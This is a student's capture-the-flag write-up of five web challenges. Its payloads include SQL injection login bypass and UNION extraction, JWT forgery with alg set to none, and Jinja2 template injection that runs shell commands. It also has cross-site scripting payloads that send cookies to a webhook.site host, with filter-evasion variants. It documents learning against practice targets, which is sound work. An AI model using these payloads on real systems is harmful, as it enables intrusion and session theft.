# 1. Database Incursion V2

> Directly access the challenge server at https://database-incursion-v2.nitephase.live/

## Solution:

- First opened it up and realised it is similar to citadel CTF's challenge
- So I first bypasses login using `' OR 1=1--`
- Now that I was on database page I could read employ names and notes
- One of them talked about management team (similar to citadel CTF)
<img width="2294" height="1505" alt="image" src="https://github.com/user-attachments/assets/c4c551c3-b627-4d4e-ba9a-7574b1226212" />

- So I entered `' OR Department='Management'--` into the query box
- Now one of them hinted to ask Kiwi, so I entered `' OR Name='Kiwi'--`
- Same as citadel ctf it was limited to 4 rows so there must be one more kiwi, thus I did `' OR ID='14'--`
- It had password in notes, so I entered `ecSKsN7SES` in admin panel
- Now the next part was pretty new, I searched up more about SQL injection online and found kind of a guidebook/cheatsheet
- I looked into this documentation a bit and found to mess with multiple tables and display them or use query of one table to view another I should use `UNION` with specific syntax
- Also the metadata thing had `REDADCTED` below, which was pretty obvioously the main thing we need to find for flag
<img width="2244" height="660" alt="image" src="https://github.com/user-attachments/assets/840c4bc3-3a70-4def-83e7-60f9f1d3c46a" />

- So I read descriptions and realised I need to call metadata table to view this
- First I entered `' UNION SELECT 1, sql, 3, 4 FROM sqlite_master WHERE tbl_name='metadata'--` and this gave me: `CREATE TABLE metadata ( id INTEGER PRIMARY KEY AUTOINCREMENT, table_name TEXT, description TEXT, columns TEXT )`
- Now we know the column name inside metadata is `table_name`, so we can use `' UNION SELECT 1, table_name, 3, 4 FROM metadata--`
- This gave me the actual name of redacted, i.e `CITADEL_ARCHIVE_2077`
- Now we need to do similar thing for `CITADEL_ARCHIVE_2077`, so I entered `' UNION SELECT 1, sql, 3, 4 FROM sqlite_master WHERE tbl_name='CITADEL_ARCHIVE_2077'--`
- I got the column name next to TEXT as `secrets`
- So I simply did `' UNION SELECT 1, secrets, 3, 4 FROM CITADEL_ARCHIVE_2077--`
- This gave me the flag!!!


## Flag:

```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```

## Concepts learnt:

- I got to learn a lot more about SQL injection
- `UNION` was a new thing I learnt about
- Also learnt more about sql_master and how to figure stuff from columns and finding them

## Notes:

- Wasted crazy amount of time cause I was doing something wrong in first step i.e bypassing login
- We can use alternative methods for kiwi step, but I remember what I did in citadel ctf so I just did that

# 2. Temporal Token

> I made my own website with custom auth, but why can't i login with my credentials? ``` Username: Belegar Password: Ironhammer ``` Directly access the challenge server at https://temporal-token.nitephase.live

## Solution:

- First I went to website and did a dummy login and it gave invalid credentials error
- Then I tried given password and username, that did give me succeed but still didn't let me in as challenge description said
```
{
  "status": 200,
  "body": {
    "success": true
  },
  "afterCheck": {
    "status": 401,
    "body": {
      "error": "Token expired"
    }
  }
}
```
- So I tried to go to cookies and got `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJCZWxlZ2FyIiwiZXhwIjowfQ.L4UuI63oMzkmh4clZMZPoANwNxnjiYTtZO90IBhQ8B8`
- Now I decoded this with base64 decoder but got broken output `{"alg":"HS256","typ":"JWT"}{"sub":"Belegar","exp":0}R:ރ3hxrVLd�7q8NNB`
<img width="1275" height="706" alt="msedge_QyEpPfDbDY" src="https://github.com/user-attachments/assets/e6056986-098d-4d85-a5d1-6d37529baf63" />

- Now I was aware it is a JWT
- So I searched more about it and found out I can change values on `jwt.io`
- I went there and decoded it properly, and decided to change exp time
- So I went to epoch time website, then increased it to one year from now on and decoded it that way
- I went to cookies and replaced it but it didn't work, later I realised it is HS256 so I need a valid signature
- I installed `jwt-cracker` using npm and used that with `rockyou.txt` but this didn't work
- Searched around more and realised I can try changing `alg` to `none` and if website has poor security it will just think that token is valid
- I put the final `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJCZWxlZ2FyIiwiZXhwIjoxNzk2MDQ3ODkxfQ.` token
- This worked and gave me the flag

```

## Concepts learnt:

- I learn how to mess with JWT tokens
- I also found about different parts of it and how to change header or content
- Got an idea on how to exploit poorly secured websites

## Notes:

- I spent quite some time on cracking a valid signature to change expiry time and exploit it

# 3. Oneshot

> Directly access the challenge server at https://pacman-git-master-mrrobot404s-projects.vercel.app

## Solution:

- First I downloaded the source python file and opened the website
- I analyzed the file and understoon that this requires SQL injection but in a different way than I am used to from previous challenges
- I further understood the code and figured that I am given a random tableID and supposed to search the password but I can only search once so I can only search one character, thus we can exploit this using SQLi to bundle up requests and exploit the database
- So first I found out my table ID by finding the hidden string in element
<img width="1969" height="714" alt="image" src="https://github.com/user-attachments/assets/fcb074e5-5655-45ac-9531-05cbb96c0e11" />

- To do this particular SQL injection we can use `UNION` and input a large command: `' AND 0 UNION ALL SELECT substr(password,1,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,2,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,3,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,4,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,5,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,6,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,7,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,8,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,9,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,10,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,11,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,12,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,13,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,14,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,15,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,16,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,17,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,18,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,19,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,20,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,21,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,22,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,23,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,24,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,25,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,26,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,27,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,28,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,29,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,30,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,31,1) FROM table_b06422c739c0b4db UNION ALL SELECT substr(password,32,1) FROM table_b06422c739c0b4db --`
- Now this searches all the characters and gives us each character

- After putting this together we can input `7c0f829454938efd9a3baa6f658b37bb` in `Guess` input box and get the flag

## Flag:

```
nite{are_you_feeling_the_heat_now :)}
```

## Concepts learnt:

- I learnt more about SQL injection
- I also learnt how we can exploit search functions like this and bundle up more requests

## Notes:

- We can also sovle this using a recursive python script but my skills are hella weak to come up with that myself, so I resorted to using the huge manual command

# 4. Sweet Haven

> After solving locally, access the challenge server at http://sweethaven.nitephase.live:57889

## Solution:

- First I installed the source and boot it up using docker
- For some reason after signing up every time I entered anything in review's input box it kept crashing the instance
- I decided to switch to official online instancce
- There was templates folder and I thus figured it was SSTI exploit
- I looked around the source code and figured there were filters set which would prevent me to directly use POCs that people have published and it used Jinja2
- The filters were:
  We cannot use `$`
  We can't use `\` followed by x,u or numbers
  We can't use single quotes `'`
- To bypass `$` block I searched around and the only bypass I found was to use `\N` followed by it's name in capital, so I can use `\N{DOLLAR SIGN}` instead of `$`
- Also the flag was in environments in source code
- We can do all this by importing `os` in python and then using `cat /flag.txt` to get this flag (and omg this wasn't simple)
- I tried to use double quotes and created a payload using a similar POC I found online: `\N{DOLLAR SIGN}{url_for.__globals__["__builtins__"].__import__("os").popen("cat /flag.txt").read()}`
- This kept crashing the website though
- At first it gave internal error, then after modifying the payload a bit it said unexpected use of `&`, so after searching a bit I figured it was double quotes causing this problem as it turned into `&` version of symbol
- Also there were issues importing stuff, so I used `\N{DOLLAR SIGN}{ config.__class__.__init__.__globals__.keys() }`
- This gave me `dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__file__', '__cached__', '__builtins__', 'functools', 'sys', 't', 'abc', 'chain', 'escape', 'Markup', 'soft_str', 'auto_aiter', 'auto_await', 'TemplateNotFound', 'TemplateRuntimeError', 'UndefinedError', 'EvalContext', '_PassArg', 'concat', 'internalcode', 'missing', 'Namespace', 'object_type_repr', 'pass_eval_context', 'V', 'F', 'exported', 'async_exported', 'identity', 'markup_join', 'str_join', 'new_context', 'TemplateReference', '_dict_method_all', 'Context', 'BlockReference', 'LoopContext', 'AsyncLoopContext', 'Macro', 'Undefined', 'make_logging_undefined', 'ChainableUndefined', 'DebugUndefined', 'StrictUndefined']) `
- Now we knew exactly what we had access to, so I decided to keep crafting other payloads
- Whatever I did kept crashing website and wouldn't simply bypass the filter
- After 50-60 tries I figured to search around a bit more and turns out we can write a payload such that it takes input from user agent and execute it
- When we use: `\N{DOLLAR SIGN}{config.__class__.__init__.__globals__.sys.modules.os.popen(config.__class__.__init__.__globals__.sys.modules.flask.request.user_agent.string).read()}`
- This will proeprly import, also it bypasses the annoying single and double quote issues that kept crashing the website
- To finally make use of it we need to resend the request after entering the payload once with user agent as `cat /flag.txt`
- This will change response and send us the flag

## Flag:

```
nite{s5t1_w17h_un1c0d3_35c4p3_byp455}
```

## Concepts learnt:

- I learnt a lot about Jinja2 and SSTI
- We can craft different payloads to bypass filters

## Notes:

- This took me hours and hours to figure out
- The final solution took almost 60 tried to finally work, I wasn't even able to reuse same account/username after paayload crashed the server once
- Pretty sure this is supposed to be solved directly without all the useragent command injection and simple filter bypass, but for whatever reason website kept crashing for me (docker wouldn't even work a bit, no idea why)
- Finally useragent thing worked so I stuck to that solution, but there has to be a normal SANE solution

# 5. Why is it not called css

> After solving locally, access the challenge server at http://whyisitnotcalledcss.nitephase.live:56743

## Solution:

- The title made it clear it is XSS (cross site scripting) cause of the reference that it isn't called CSS and called XSS instead lol
- Now that I knew this, I went to guide sites given in PDF and tried to learn more about XSS
- Then I looked through source code and realised it has filters, which will be used in 2nd and 3rd part
- The first part had no filters so I can just use a basic payload
- I opened terminal and started my docker instance in its directory using `docker compose up -d --build`
- Then went to my local ip with port 56743 (also did again in official website using same payloads)
- So the xss exploit in this was reflected XSS and it basically uses parameters in url to execute stuff, it also showed me a preview where the bot would go if I enter a payload
- We need a webhook, which will kind of act like a listener and interscept the response to show us output of our payload, so I decided to use webhook.site and used the url in my payload
- For first payload I entered:
```
<script>
  window.location='https://webhook.site/91eb2855-8e81-4706-887c-5143e2d36666/?cookie=' + document.cookie;
</script>
```
- Then I got parameter `bf2a73106a3a6328746782b8b47e4bd350e` (docker) and `bf2a73106a3aa48bab9b8b47e4bd350e` (official instance) and added it behind the website
- For second part the filters were `return payload.lower().replace("script", "").replace("img", "").replace("svg", "")`
- To bypass this we can enter `scrscriptipt` and it will make it `script`
- So for second one we can use payload:
```
<scrscriptipt>
window.location='https://webhook.site/91eb2855-8e81-4706-887c-5143e2d36666/?cookie='+document.cookie
</scrscriptipt>
```
- This will give us parameters: `3e79c8a642j4hh2hbb7832384f043` (docker) and `3e79c8a64bd10f5fa897b7832384f043` which I will put behind url for 3rd part
- Third part had filters
```
def filter_3(payload):
    if "://" in payload.lower():
return "Nope"
    if "document" in payload.lower():
return "Nope"
    if "cookie" in payload.lower():
return "Nope"
    return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
```
- So for third part we will have to use mix of `+` in javascript syntax and unicode to bypass the filter
- Thus we can use payload:
```
<scrscriptipt>
window.location='https:'+'/'+'/webhook.site/91eb2855-8e81-4706-887c-5143e2d36666/?c='+window['\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074']['\u0063\u006f\u006f\u006b\u0069\u0065']
</scrscriptipt>
```
- This gives us the flag!!

```

## Concepts learnt:

- I learnt basics of XSS exploitation
- I also learnt about different HTML tags and how I can trick filters to abuse them

## Notes:

- At first it was very confusing because I have never done XSS exploitation
- Then I learnt through guides, understood basics of it and found different methods to exploit it
- We can probably also use img and onerror together to exploit this
- Third part was hella confusing because I first tried url parameter for `://` and unicode for `document.cookie` but it converted url parameter to further more parameters when passing to bot, then I tried to use direct url parameter myself but it kept flagging in filter and didn't work, so at the end I made seperate parts and added using `+`
